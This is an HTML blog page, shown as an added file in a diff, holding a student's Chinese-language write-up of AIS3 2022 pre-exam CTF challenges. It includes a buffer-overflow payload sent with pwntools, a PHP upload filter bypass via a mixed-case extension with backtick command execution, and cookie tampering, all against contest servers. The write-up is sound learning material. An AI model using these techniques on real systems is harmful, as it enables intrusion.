@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="這是我接觸 ctf 後第一次正式的比賽 &gt; &lt;。AIS3 pre-exam 是跟 My First CTF 一起舉辦的，很可惜的是今年因為疫情所以改為線上舉行 QQ。   這次線上要掛 vpn，用的是 wireguard。然後我在賽中才發現忘記在 VM 裝，花了一小時還是裝不起來，最後只好跑去裝 Windows 版的 netcat。 因為窩弱所以這個 write up 題目應該會很少吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 2022 pre-exam write up">
+<meta property="og:url" content="http://example.com/2022/07/08/AIS3-2022-pre-exam-write-up/index.html">
+<meta property="og:site_name" content="onion 隨筆">
+<meta property="og:description" content="這是我接觸 ctf 後第一次正式的比賽 &gt; &lt;。AIS3 pre-exam 是跟 My First CTF 一起舉辦的，很可惜的是今年因為疫情所以改為線上舉行 QQ。   這次線上要掛 vpn，用的是 wireguard。然後我在賽中才發現忘記在 VM 裝，花了一小時還是裝不起來，最後只好跑去裝 Windows 版的 netcat。 因為窩弱所以這個 write up 題目應該會很少吧">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://i.imgur.com/zxxBLyX.png">
+<meta property="og:image" content="https://i.imgur.com/kx2KhB0.png">
+<meta property="og:image" content="https://i.imgur.com/lxmp1X3.png">
+<meta property="og:image" content="https://i.imgur.com/ldqWXDt.png">
+<meta property="og:image" content="https://i.imgur.com/nLVnKSN.png">
+<meta property="og:image" content="https://i.imgur.com/uGmhUDi.png">
+<meta property="og:image" content="https://i.imgur.com/tPwOeRL.png">
+<meta property="og:image" content="https://i.imgur.com/2mxMdu3.png">
+<meta property="article:published_time" content="2022-07-08T03:09:37.000Z">
+<meta property="article:modified_time" content="2022-07-08T03:13:12.000Z">
+<meta property="article:author" content="onion chen">
+<meta property="article:tag" content="Write Up">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/zxxBLyX.png">
+
+<link rel="canonical" href="http://example.com/2022/07/08/AIS3-2022-pre-exam-write-up/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-TW'
+  };
+</script>
+
+  <title>AIS3 2022 pre-exam write up | onion 隨筆</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">onion 隨筆</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">onion's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>標籤</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>歸檔</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/08/AIS3-2022-pre-exam-write-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="onion chen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="onion 隨筆">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AIS3 2022 pre-exam write up
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+              
+
+              <time title="創建時間：2022-07-08 11:09:37 / 修改時間：11:13:12" itemprop="dateCreated datePublished" datetime="2022-07-08T11:09:37+08:00">2022-07-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>這是我接觸 ctf 後第一次正式的比賽 &gt; &lt;。AIS3 pre-exam 是跟 My First CTF 一起舉辦的，很可惜的是今年因為疫情所以改為線上舉行 QQ。  </p>
+<p>這次線上要掛 vpn，用的是 wireguard。然後我在賽中才發現忘記在 VM 裝，花了一小時還是裝不起來，最後只好跑去裝 Windows 版的 netcat。</p>
+<p>因為窩弱所以這個 write up 題目應該會很少吧 QQ</p>
+<span id="more"></span>
+
+<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>開賽前助教就已經在 discord 傳了 flag。而且題目敘述還是 discord ++。笑爛wwww<br><img src="https://i.imgur.com/zxxBLyX.png"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h3><p>題目給的資料夾裡面有加密用的 python 檔、加密過的 flag 、加密過的加密 python 檔(?</p>
+<p><img src="https://i.imgur.com/kx2KhB0.png"></p>
+<p><img src="https://i.imgur.com/lxmp1X3.png"></p>
+<p>而 code 下面則是一串關於替換式密碼的維基百科<br>所以直接比較兩邊的字母，建立替換表，最後把加密過的 flag 逆回去就好了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">plain = 那一大串明文</span><br><span class="line">cipher = 那一大串密文</span><br><span class="line">flag_enc = <span class="string">&quot;5xvJ&#123;IVnCDwT_I24t6W626DVw_ODPzJi_FDMz_awVFw_PWmDw6J86_m66cOa&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">T = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">    T[cipher[i]] = plain[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag_enc:</span><br><span class="line">    flag += T[c]</span><br></pre></td></tr></table></figure>
+<p>Flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fast-Cipher"><a href="#Fast-Cipher" class="headerlink" title="Fast Cipher"></a>Fast Cipher</h3><p>在給的加密程式中有一段 <code>encrypt()</code> 函數</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pt, key</span>):</span><br><span class="line">    ct = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> pt:</span><br><span class="line">        ct.append(c ^ (key &amp; <span class="number">0xFF</span>))</span><br><span class="line">        key = f(key)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ct)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到會一個個將明文對 key 進行 xor<br>透過 flag 第一個字一定是 A 可以得到 key 是 0x2D<br>接下來反著做回去就好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&quot;6c0ec840f88d4cd7fcc6d5c6d1dafcc1cad7d0fcc2d1c6fcd6d0c6c7fccfcccfde&quot;</span></span><br><span class="line">key = <span class="number">45</span></span><br><span class="line"></span><br><span class="line">plain = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">2</span>):</span><br><span class="line">    b = cipher[i] + cipher[i+<span class="number">1</span>]</span><br><span class="line">    b = <span class="built_in">int</span>(b, <span class="number">16</span>)</span><br><span class="line">    mask = key &amp; <span class="number">0xFF</span></span><br><span class="line">    c = b ^ mask</span><br><span class="line">    c = <span class="built_in">chr</span>(c)</span><br><span class="line">    key = f(key)</span><br><span class="line">    plain += c</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure>
+<p>Flag:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;not_every_bits_are_used_lol&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Excel"><a href="#Excel" class="headerlink" title="Excel"></a>Excel</h3><p>下載檔案後查看巨集，單步執行然後查看評估值，就得到答案了<br>Flag:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;XLM_iS_to0_o1d_but_co0o0o00olll!!&#125;</span><br></pre></td></tr></table></figure>
+<p>哭挖然後這題那時候卡在 flag 最後是 l 而不是 1 和 | </p>
+<h3 id="Gift-in-the-dream"><a href="#Gift-in-the-dream" class="headerlink" title="Gift in the dream"></a>Gift in the dream</h3><p>用 strings 可以看到這個 gif 裡面有一堆的<code> why is the animation lagging? why is the duration so weird? is this just a dream?</code></p>
+<p>通靈了一下然後跑去用工具查看了這張圖裡面各個幀之間的間隔，發現都在 ascii 可視字元的範圍內<br>所以寫了以下來解碼  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delay = [<span class="number">65</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">123</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">51</span>, <span class="number">103</span>, <span class="number">52</span>\</span><br><span class="line">    , <span class="number">110</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">82</span>, <span class="number">52</span>, <span class="number">112</span>, <span class="number">72</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">52</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">98</span>, <span class="number">51</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">85</span>, \</span><br><span class="line">        <span class="number">110</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">48</span>, <span class="number">109</span>, <span class="number">51</span>, <span class="number">55</span>, <span class="number">105</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> delay:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>Flag:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="SAAS-Crash"><a href="#SAAS-Crash" class="headerlink" title="SAAS - Crash"></a>SAAS - Crash</h3><p>本來看 source code 沒看出什麼東西，試著構造可以 overflow 的字串也被擋了下來，不過後來在這系統裡面玩了一下，不知道是因為我的奇怪操作還是因為其他原因，他就自己噴 flag 出來了 www。  </p>
+<p>Flag:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bof2Win"><a href="#Bof2Win" class="headerlink" title="Bof2Win"></a>Bof2Win</h3><p>看 source code 發現可以 bof ，並且有一個函數 <code>get_the_flag()</code> 沒有被調用到，看起來是要覆蓋 return address 到這個函數就可以到 flag。  </p>
+<p>首先丟進 gdb 看看 <code>get_the_flag</code> 的位置在哪裡<br><img src="https://i.imgur.com/ldqWXDt.png"></p>
+<p>先丟一串東西進去看看 offset</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/nLVnKSN.png"></p>
+<p>0x47 是 G，0x48 是 H<br>所以可以知道 rip 存在 G 跟 H 的位置<br>把剛剛拿到的 get_the_flag() 位置替換進去 (注意 little endian)<br>可以得到要注入的字串:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;AAAABBBBCCCCDDDDEEEEFFFF\x16\x12\x40\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure>
+<p>用 pwntools 送過去就可以得到 flag 了:D</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host = <span class="string">&quot;chals1.ais3.org&quot;</span></span><br><span class="line">port = <span class="number">12347</span></span><br><span class="line"></span><br><span class="line">r = remote(host, port)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&quot;AAAABBBBCCCCDDDDEEEEFFFF\x16\x12\x40\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>Flag:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Re@1_B0F_m4st3r!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Time-Management"><a href="#Time-Management" class="headerlink" title="Time Management"></a>Time Management</h3><p>丟進 Ghidra 後看到以下的東西<br><img src="https://i.imgur.com/uGmhUDi.png"></p>
+<p>14 行有一個 sleep 會讓程式執行很久  </p>
+<p>一開始我本來想要用一個在 picoCTF 的 writeup 看到的方法  </p>
+<p>就是自己寫一個假的 <code>sleep()</code> 然後把他編譯成 object 檔並且用 LD_PRELOAD 讓這個假的 <code>sleep()</code> 跟著程式一起執行。但是有 <code>fflush()</code> 所以讓 flag 的文字沒有出來 QQ  </p>
+<p>所以只好用 gdb 來一步一步做，遇到 sleep 就跳過去。</p>
+<p><img src="https://i.imgur.com/tPwOeRL.png"></p>
+<p>設下兩個 break point，135 是 sleep，157 是 printf。兩個的位置是從前面的 disassemble main 指令得到的  </p>
+<p>然後只要每次到 sleep 那邊就下 <code>set $pc = *main+140</code>來跳到下個指令<br>接下來 <code>c</code> 來繼續  </p>
+<p>因為這邊 printf() 有兩個參數：<code>%c</code> 和 <code>local_14</code>，local_14 是我們想要的，而且根據 calling convention 可以知道這個會放在 rsi 裡面  </p>
+<p><img src="https://i.imgur.com/2mxMdu3.png"></p>
+<p>printf() 會拿最後一個位元組來輸出，而 0x41 正好就是 A，0x49 是 I。<br>只要一直重複 <code>c</code> 和 <code>set $pc = *main+140</code> 就可以拿到 各個字元了 &gt; &lt;  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="string">&quot;41&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;53&quot;</span>, <span class="string">&quot;33&quot;</span>, <span class="string">&quot;7b&quot;</span>, <span class="string">&quot;59&quot;</span>, <span class="string">&quot;6f&quot;</span>, <span class="string">&quot;75&quot;</span>, <span class="string">&quot;5f&quot;</span>, <span class="string">&quot;61&quot;</span>, <span class="string">&quot;72&quot;</span>, <span class="string">&quot;65&quot;</span>\</span><br><span class="line">	, <span class="string">&quot;5f&quot;</span>, <span class="string">&quot;74&quot;</span>, <span class="string">&quot;68&quot;</span>, <span class="string">&quot;65&quot;</span>, <span class="string">&quot;5f&quot;</span>, <span class="string">&quot;6d&quot;</span>, <span class="string">&quot;61&quot;</span>, <span class="string">&quot;73&quot;</span>, <span class="string">&quot;74&quot;</span>, <span class="string">&quot;65&quot;</span>, <span class="string">&quot;72&quot;</span>, <span class="string">&quot;5f&quot;</span>\</span><br><span class="line">		, <span class="string">&quot;6f&quot;</span>, <span class="string">&quot;66&quot;</span>, <span class="string">&quot;5f&quot;</span>, <span class="string">&quot;74&quot;</span>, <span class="string">&quot;69&quot;</span>, <span class="string">&quot;6d&quot;</span>, <span class="string">&quot;65&quot;</span>, <span class="string">&quot;5f&quot;</span>, <span class="string">&quot;6d&quot;</span>, <span class="string">&quot;61&quot;</span>, <span class="string">&quot;6e&quot;</span>, <span class="string">&quot;61&quot;</span>\</span><br><span class="line">			, <span class="string">&quot;67&quot;</span>, <span class="string">&quot;65&quot;</span>, <span class="string">&quot;6d&quot;</span>, <span class="string">&quot;65&quot;</span>, <span class="string">&quot;6e&quot;</span>, <span class="string">&quot;74&quot;</span>, <span class="string">&quot;21&quot;</span>, <span class="string">&quot;21&quot;</span>, <span class="string">&quot;21&quot;</span>, <span class="string">&quot;21&quot;</span>, <span class="string">&quot;21&quot;</span>, <span class="string">&quot;7d&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">	a = <span class="built_in">int</span>(i, <span class="number">16</span>)</span><br><span class="line">	c = <span class="built_in">chr</span>(a)</span><br><span class="line">	<span class="built_in">print</span>(c, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Flag:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;You_are_the_master_of_time_management!!!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Poking-Bear"><a href="#Poking-Bear" class="headerlink" title="Poking Bear"></a>Poking Bear</h3><p>觀察網頁可以看到每隻熊是透過 <code>/</code> 後面的數字來定位的，不過前往 secret bear 的頁面的按鈕沒辦法點..<br>所以用爬蟲一個一個戳，看看還有哪些是開的  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://chals1.ais3.org:8987/bear/<span class="subst">&#123;<span class="built_in">str</span>(i)&#125;</span>&quot;</span></span><br><span class="line">    request = req.Request(url, headers=&#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">with</span> req.urlopen(request) <span class="keyword">as</span> response:</span><br><span class="line">        data = response.read().decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    root = bs4.BeautifulSoup(data, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    titles = root.find_all(<span class="string">&quot;h1&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(titles) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br></pre></td></tr></table></figure>
+<p>可以發現 499 有熊在那邊，去那邊也發現的確是 secret bear。<br>不過跟他要 flag 他說要是 <code>bear poker</code> 才可以拿…<br>打開 f12 後發現 cookie 裡面有一個叫做 human 的 cookie<br>把他的 value 改成 <code>bear poker</code> 後就拿到 flag 了:D  </p>
+<p>Flag:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;y0u_P0l&lt;3_7h3_Bear_H@rdLy&gt;&lt;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Simple-File-Uploader"><a href="#Simple-File-Uploader" class="headerlink" title="Simple File Uploader"></a>Simple File Uploader</h3><blockquote>
+<p>網站是簡單檔案上傳者<br>那大家上傳的 code 算不算<strong>簡單檔案上傳終結者</strong>:thinking_face: </p>
+</blockquote>
+<p>看看 source code 發現他沒有檢查副檔名的大小寫，所以上傳 <code>.pHp</code> 發現 server 給過而且還會執行。  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//First approach</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因為 server 會擋含有 <code>dirscan()</code> 的東西上傳，不過沒擋到 <code>glob()</code> :D<br>所以用 <code>glob()</code> 掃根目錄有什麼  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Second approach</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="variable">$directories</span> = <span class="title function_ invoke__">glob</span>(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$directories</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$val</span>&lt;BR&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>發現有一個非~常可疑的檔案 <code>/rUn_M3_t0_9et_fL4g</code><br>不過有擋 <code>exec()</code> 和 <code>eval()</code><br>查了一下發現 backtick 也可以執行指令:DDD</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> `/rUn_M3_t0_9et_fL4g`;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然後就得到 flag 啦 ٩(ˊᗜˋ*)و<br>Flag:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="心得"><a href="#心得" class="headerlink" title="心得(?"></a>心得(?</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Final Rank: 96</span><br></pre></td></tr></table></figure>
+<p>這是我第一次參加這種活動，但沒上真的很可惜QQ<br>希望甄選有機會上囉:D</p>
+<p>中間卡了好幾題，像是 reverse 的<code>殼</code>和 misc 的 <code>knock</code>，<code>knock</code> 更是卡了我整整一天，看著越來越多人解出來，而那題的分數越來越下降真的很讓人挫折…</p>
+<p><code>殼</code>沒有解出來真的很遺憾，這還讓我想到 picoCTF 上面有一題超爛的 rockstar，解 rockstar 的時候真的是折騰了好久，不過最後沒有解出<code>殼</code>是遺憾之一。</p>
+<p>然後我真的一直把 <code>knock</code> 當 web 題，nmap 掃 port 後看到 139 和 445 有開，而且 nmap 也說那邊有 smb 服務，就一直往 smb 去解…結果是用 wireshark 錄封包…</p>
+<p>但是那種拿到 flag 的開心感最令我難以忘記，尤其是 <code>bof2win</code>，因為這是我第一次實作覆蓋 return address (之前只有聽 liveoverflow 講過)，真的很令人開心 ٩(ˊᗜˋ*)و</p>
+<p>本文章同步發布於 <a target="_blank" rel="noopener" href="https://hackmd.io/@onion0905/Sk4LIM6Lq">HackMD</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Write-Up/" rel="tag"># Write Up</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/08/Make-a-Music-Game-101/" rel="prev" title="Make a Music Game 101">
